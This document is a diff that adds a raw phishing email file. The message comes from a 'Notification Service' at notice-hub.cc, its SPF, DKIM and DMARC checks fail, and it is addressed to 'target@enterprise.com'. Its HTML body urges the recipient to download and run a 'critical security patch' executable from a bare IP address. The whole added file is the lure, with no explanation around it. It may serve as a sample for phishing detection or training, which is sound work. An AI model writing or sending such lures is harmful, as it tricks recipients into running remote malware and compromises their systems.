@@ -1,0 +1,8 @@
+Authentication-Results: spf=neutral; dkim=none; dmarc=none
+From: "Notification Service" <alert@notice-hub.cc>
+To: target@enterprise.com
+Subject: Critical System Update Required
+Date: Mon, 16 Sep 2026 15:30:00 +0000
+Content-Type: text/html; charset="UTF-8"
+
+<html><body><p>Download and run the critical security patch:</p><p><a href="http://185.220.101.5/update.exe">Download Patch</a></p></body></html>
